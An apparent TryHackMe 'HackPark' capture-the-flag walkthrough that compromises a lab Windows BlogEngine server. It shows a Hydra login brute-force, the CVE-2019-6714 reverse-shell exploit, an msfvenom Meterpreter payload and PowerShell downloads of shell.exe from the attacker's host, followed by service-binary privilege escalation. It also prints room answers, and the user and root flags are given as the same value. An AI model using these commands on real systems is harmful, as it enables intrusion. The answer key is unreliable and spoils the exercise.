# HackPark

Room [HackPark](https://tryhackme.com/room/hackpark)

#

<h3>Make a Directory with the Room Name in the TryHackMe Folder</h3>

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "HackPark".

`mkdir HackPark`

- Change directory into HackPark.

`cd HackPark/`

<p align="center"> <img src="https://i.imgur.com/LcGUjmv.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.251.165]

Introduction: 
This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

Whats the name of the clown displayed on the homepage?

`Pennywise`

<p align="center"> <img src="https://i.imgur.com/6zPepbG.png" height="90%" width="90%" alt=""/>

#

# Reconnaissance

Gather the Information from the Target Machine with `Nmap` Command. Find the open ports on the machine.

On Terminal: `nmap -sC -sV -oN nmap_initial.txt 10.10.251.165`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `10.10.251.165`.

<p align="center"> <img src="https://i.imgur.com/s5HluDR.png" height="90%" width="90%" alt=""/>

#

# Using Hydra to brute-force a login Question

Question 1: What request type is the Windows website login form using?

Question 2: Guess a username, choose a password wordlist and gain credentials to a user account!

#

# Question 1

We want to locate a login page to investigate and figure out the kind of communication it has with the web server. Normally, web servers have two types of communication: a GET request, which is for asking the server for information, and a POST request, which is for sending data to the server.

To find out what type of request a form is using, you can right-click on the login form, choose "Inspect," and then look for the value in the "method" field. Alternatively, if you're using BurpSuite to intercept the traffic, you can also discover this information there (you can find other HTTP methods there too).

Open up Burp Suite > Go to "Proxy" Tab > Open Browser.

<p align="center"> <img src="https://i.imgur.com/EW2Vrrh.png" height="90%" width="90%" alt=""/>

Navigate to the webpage > Click on the three lines on Upper right corner > Select "LOG IN".

<p align="center"> <img src="https://i.imgur.com/svMJeJO.png" height="90%" width="90%" alt=""/>

On the log in page, type in random stuff for username and password > Turn ON "interception" on Burp Suite > Click on "LOG IN" on Webpage.

<p align="center"> <img src="https://i.imgur.com/Eo0BZnp.png" height="90%" width="90%" alt=""/>

We got the request type is using POST request for the Windows website login form.

<p align="center"> <img src="https://i.imgur.com/gUXUBLo.png" height="90%" width="90%" alt=""/>

Question 1: What request type is the Windows website login form using?

`POST`

#

# Question 2

Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.

But First we will highlight what we need for the hydra command.
- The first line between "POST" and "HTTP/1.1".
- The whole section of "VIEWSTATE" and "EVENTVALIDATION".
- The Login failed message.

<p align="center"> <img src="https://i.imgur.com/RoXeBLS.png" height="90%" width="90%" alt=""/>

To obtain the login fail message > Click on Forward on Burp Suite.
- Failed login message: "Login failed".

<p align="center"> <img src="https://i.imgur.com/1PW5az2.png" height="90%" width="90%" alt=""/>

Now we will bruteforce the webpage with "admin" as username to gain admin privileges.

On terminal we will run the following command: 

`hydra -l admin -P ../../wordlists/rockyou.txt 10.10.251.165 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=UqdXYcNqgKHpn2%2BpdCIS3gYnqlac%2BKkIxoetD53FHHWChj8DB%2B4imTd8kwTha5WfDrtnKbjHCmkSqPlh3eIfc5DiqyhR5hjO%2BawjD3VznS7A0z4z19Fx0ahHdfYZGz6PTlRSsbkilSS0EUCBxA0%2BRZkdnf2x9zBwZA6G9Rh%2FrnXLK8WtC9%2FQKeFg0tb0EK9UDMwliypjbrq8Uh1%2BndI%2BAMxJbcyD5eZtNgKnV4P%2FN3%2Bc5XccnNy%2FtFDR0rpd6DxBFI0A1zL2EiWg540RIPGv9IvgDP9FayCb6Rm8Os75p3bD7yrYb4w3dVqLfjc%2FTaSV597%2BiZ%2BDRiaGILoVaUP7cwVBLNFl76F18NM9vNhpmUDRcWvj&__EVENTVALIDATION=y5nRmLKKmybfVqMpVqlCjWjWLKwuxTmpxmJH8gzayJTJTbOIDNXGTOYBOFRaeuRrCp%2FUSW7%2F9JCcXJlCNzxTq9IGJKrC29fTnMYo4XHdoyj6B4Bq88xKa0Dpez4zxsBbIzHGsLQFW3%2BolDEi5vGQGd5W1Od7DQ7u55Jx8iLJEKApamOE&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv`

- `hydra`: The command itself, invoking the Hydra tool.

- `-l admin`: Specifies the login username to be "admin."

- `-P ../../wordlists/rockyou.txt`: Specifies the path to a file containing a list of passwords (../../wordlists/rockyou.txt in this case).

- `10.10.251.165`: The IP address of the target system.

- `http-post-form`: Indicates the type of attack, in this case, it's an HTTP POST form-based attack.

- `"/Account/login.aspx?ReturnURL=/admin: ... : Login Failed"`:
  - Specifies the login form details:
    - `/Account/login.aspx?ReturnURL=/admin`: The URL of the login page.
    - `The long string after the colon (:)` represents various parameters that are part of the POST request, including ViewState, EventValidation, and the login form fields.
    - `^USER^` and `^PASS^`: are placeholders that Hydra will replace with the actual username and password during the brute-force attack.
    - `Login Failed`: The failure message indicating an unsuccessful login attempt.
- `-vv`: (verbose) option is used to increase the verbosity of the output. 

We changed:

- `/Account/login.aspx?ReturnURL=%2fadmin%2f` into: `/Account/login.aspx?ReturnURL=/admin`
- `UserName=a` into `UserName=^USER^`
- `Password=a` into `Password=^PASS^`

Added in:

- `:Login Failed` for login message.

Successfully bruteforce the password

<p align="center"> <img src="https://i.imgur.com/ixYx6YY.png" height="90%" width="90%" alt=""/>

Question 2: Guess a username, choose a password wordlist and gain credentials to a user account!

`1qaz2wsx`

Cheatsheet for Hydra:

<p align="center"> <img src="https://i.imgur.com/yKEMYKA.png" height="90%" width="90%" alt=""/>

#

# Compromise the machine Question

Question 1: Now you have logged into the website, are you able to identify the version of the BlogEngine?

Question 2: What is the CVE?

Question 3: Who is the webserver running as?

#

# Question 1

Login the webpage with "admin" as username and "1qaz2wsx" as password.

Click on the three lines on the upper right corner > Select "ABOUT".

<p align="center"> <img src="https://i.imgur.com/65ftqLd.png" height="90%" width="90%" alt=""/>

Found the Version of BlogEngine used on the website.

<p align="center"> <img src="https://i.imgur.com/lEm9hgI.png" height="90%" width="90%" alt=""/>

Question 1: Now you have logged into the website, are you able to identify the version of the BlogEngine?

`3.3.6.0`

#

# Question 2

Use Exploit-DB to find the CVE.

Google: "Exploit-DB BlogEngine 3.3.6 Reverse Shell" > Click on the first link.

<p align="center"> <img src="https://i.imgur.com/W0MD86L.png" height="90%" width="90%" alt=""/>

Found the CVE.

<p align="center"> <img src="https://i.imgur.com/5wfoOOq.png" height="90%" width="90%" alt=""/>

Question 2: What is the CVE?

`CVE-2019-6714`

#

# Question 3


Using the public exploit, gain initial access to the server.

We will download the exploit on the Exploit-DB website.

<p align="center"> <img src="https://i.imgur.com/wuxeAQJ.png" height="90%" width="90%" alt=""/>

Move the exploit into our Project directionary.

<p align="center"> <img src="https://i.imgur.com/394zclE.png" height="90%" width="90%" alt=""/>

Open the exploit and edit it:

Change the IP Address: "10.10.10.20" into your local machine IP.
Change the Port: "444" into your preferred port.
Save.

<p align="center"> <img src="https://i.imgur.com/c8n9vXv.png" height="90%" width="90%" alt=""/>

We will need to change the exploit's name and file type into "PostView.ascx". According to the comment stated in the exploit.

<p align="center"> <img src="https://i.imgur.com/fNmhfM5.png" height="90%" width="90%" alt=""/>

We will use the mv command again to change the name and type of the file.

<p align="center"> <img src="https://i.imgur.com/cu1ceqN.png" height="90%" width="90%" alt=""/>

We will use the `ncat` command in order to listen to port 1202 connection.

<p align="center"> <img src="https://i.imgur.com/dnZxOEq.png" height="90%" width="90%" alt=""/>

We now need to upload the "PostView.ascx" to the webpage.

Navigate to the webpage > Click on the three lines > Select "CONTENT" > Click on the "Welcome to HackPark".

<p align="center"> <img src="https://i.imgur.com/DBG3j1b.png" height="90%" width="90%" alt=""/>

Click on "File manager".

<p align="center"> <img src="https://i.imgur.com/6Ude17D.png" height="90%" width="90%" alt=""/>

Click on "UPLOAD" > Find "PostView.ascx" > Upload.

<p align="center"> <img src="https://i.imgur.com/1bzAugy.png" height="90%" width="90%" alt=""/>

Like the exploit comment said: we have to go to `/?theme=../../App_Data/files` path on th webpage.

<p align="center"> <img src="https://i.imgur.com/wiEz5eJ.png" height="90%" width="90%" alt=""/>

Successfully got the shell with `ncat`.

<p align="center"> <img src="https://i.imgur.com/f9iXA27.png" height="90%" width="90%" alt=""/>

We can use `whoami` command to see who the webserver is running as.

<p align="center"> <img src="https://i.imgur.com/jDXfD4f.png" height="90%" width="90%" alt=""/>

Question 3: Who is the webserver running as?

`iis apppool\blog`

#

#  Windows Privilege Escalation Question

Question 1: What is the OS version of this windows machine?

Question 2: What is the name of the abnormal service running?

Question 3: What is the name of the binary you're supposed to exploit? 

Question 4: What is the user flag (on Jeffs Desktop)?

Question 5: What is the root flag?

In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

#

# Question 1

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities.

On the terminal we will use msfvenom command.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.106.187 LPORT=1337 -f exe > shell.exe`

- `msfvenom`: This is a part of the Metasploit Framework used for generating payloads.

- `-p windows/meterpreter/reverse_tcp`: Specifies the payload to be generated. In this case, it's a Windows Meterpreter reverse TCP shell, which allows the attacker to control a compromised system.

- `LHOST=10.6.106.187`: Specifies the IP address of the listener (attacker's machine) to which the target system will connect back. Replace 10.6.106.187 with the actual IP address.

- `LPORT=1337`: Specifies the port number on the listener (attacker's machine) where the connection will be received. Replace 1337 with the desired port number.

- `-f exe`: Specifies the format of the output payload. In this case, it's set to generate an executable (.exe) file.

- `> shell.exe`: Redirects the output to a file named shell.exe. The generated payload will be saved in this file.

In summary, this msfvenom command is generating a Windows Meterpreter reverse TCP payload, configuring it to connect back to the specified IP address and port, and saving the output as an executable file named shell.exe. This payload can be used as part of a penetration test or ethical hacking activity to gain control over a Windows system. Always ensure that you have proper authorization before using such tools and payloads in any environment. Unauthorized use is illegal and unethical.

<p align="center"> <img src="https://i.imgur.com/OFWI5X0.png" height="90%" width="90%" alt=""/>

We will dump the "shell.exe" payload into the Windows/Temp directory on the shell. First we will use `cd` command to move to the directory `/Windows/Temp`.

<p align="center"> <img src="https://i.imgur.com/A30V4N3.png" height="90%" width="90%" alt=""/>

We will need to open up a new terminal and use the command:

`python3 -m SimpleHTTPServer`

<p align="center"> <img src="https://i.imgur.com/lEVwqk7.png" height="90%" width="90%" alt=""/>

On the Shell terminal we will use:

`powershell -c "Invoke-WebRequest -Uri 'http://10.6.106.187:8000/shell.exe' -OutFile 'C:/Windows/Temp/shell.exe'`
- http://10.6.106.187 is our local machine.

<p align="center"> <img src="https://i.imgur.com/3XmqMM1.png" height="90%" width="90%" alt=""/>

We will now need to open up metasploit with `msfconsole` to exploit the payload on a new terminal. And follow the command:

<p align="center"> <img src="https://i.imgur.com/IJhcJCb.png" height="90%" width="90%" alt=""/>

Now we will need to go back to the shell terminal and run the "shell.exe" payload.

`.\shell`
- Successfully got into meterpreter on our local machine.

<p align="center"> <img src="https://i.imgur.com/roHVxwF.png" height="90%" width="90%" alt=""/>

We can use the `sysinfo` command to get the OS version.

<p align="center"> <img src="https://i.imgur.com/YxbHtXa.png" height="90%" width="90%" alt=""/>

Question 1: What is the OS version of this windows machine?

`Windows 2012 R2 (6.3 Build 9600)`

#

# Question 2

We will go into shell with the meterpreter > Change directory into "Program Files (x86).

<p align="center"> <img src="https://i.imgur.com/q1NoG5T.png" height="90%" width="90%" alt=""/>

We will download winpeas.bat from https://github.com/carlospolop/PEASS-ng/releases/tag/20231112-0a42c550

- Upload winPEAS.bat to shell
- Go into shell
- run `winPEAS.bat serviceinfo`

<p align="center"> <img src="https://i.imgur.com/n8meD5n.png" height="90%" width="90%" alt=""/>

Question 2: What is the name of the abnormal service running?

`WindowsScheduler`

#

# Question 3

We first change the directory to `\Program Files (x86)` and see what it contains.

<p align="center"> <img src="https://i.imgur.com/PbJ1xLK.png" height="90%" width="90%" alt=""/>

Change the directory into `SystemScheduler` and see what it contains.

<p align="center"> <img src="https://i.imgur.com/ScOfdkT.png" height="90%" width="90%" alt=""/>

Change the directory into `Events` and see what it contains.

<p align="center"> <img src="https://i.imgur.com/SMcIqkk.png" height="90%" width="90%" alt=""/>

Look into the log file "20198415519.INI_LOG.txt" using the `type` command.

<p align="center"> <img src="https://i.imgur.com/7j6EU3K.png" height="90%" width="90%" alt=""/>

Question 3: What is the name of the binary you're supposed to exploit? 

`message.exe`

#

# Question 4

Redo to put Shell.exe into the target machine's `c:\Program Files (x86)\SystemScheduler`

- Stop the `python3 -m http.server`
- Redo: `python3 -m http.server 1111`
- In Shell: change cd into `c:\Program Files (x86)\SystemScheduler`
- Redo: `powershell -c "Invoke-WebRequest -Uri 'http://10.6.106.187:1111/shell.exe' -OutFile 'c:\Program Files (x86)\SystemScheduler\shell.exe'"`

<p align="center"> <img src="https://i.imgur.com/fMfyzV0.png" height="90%" width="90%" alt=""/>

Successfully put shell.exe into `c:\Program Files (x86)\SystemSchedule`

<p align="center"> <img src="https://i.imgur.com/NnffIW3.png" height="90%" width="90%" alt=""/>

Return shell into meterpreter > `mv Message.exe Message.bak`

<p align="center"> <img src="https://i.imgur.com/F5brO9x.png" height="90%" width="90%" alt=""/>

Mover shell.exe into Message.exe > `mv shell.exe Message.exe`

<p align="center"> <img src="https://i.imgur.com/92zNeQt.png" height="90%" width="90%" alt=""/>

`background` > `run`
- Successfully gain system privilege.

<p align="center"> <img src="https://i.imgur.com/aeh3Tyu.png" height="90%" width="90%" alt=""/>

We will change directory to jeff's desktop and get the user.txt flag with `cat` command.

<p align="center"> <img src="https://i.imgur.com/P5Q5lGQ.png" height="90%" width="90%" alt=""/>

Question 4: What is the user flag (on Jeffs Desktop)?

`759bd8af507517bcfaede78a21a73e39`

# 

# Qusetion 5

We will change directory to Administrator's desktop and get the root.txt flag with `cat` command.

<p align="center"> <img src="https://i.imgur.com/Ab4ifRQ.png" height="90%" width="90%" alt=""/>

Question 5: What is the root flag?

`759bd8af507517bcfaede78a21a73e39`

#

# Privilege Escalation Without Metasploit Question

Question: Using winPeas, what was the Original Install time? (This is date and time)

`8/3/2019, 10:43:23 AM`

<p align="center"> <img src="https://i.imgur.com/WXvzAEh.png" height="90%" width="90%" alt=""/>

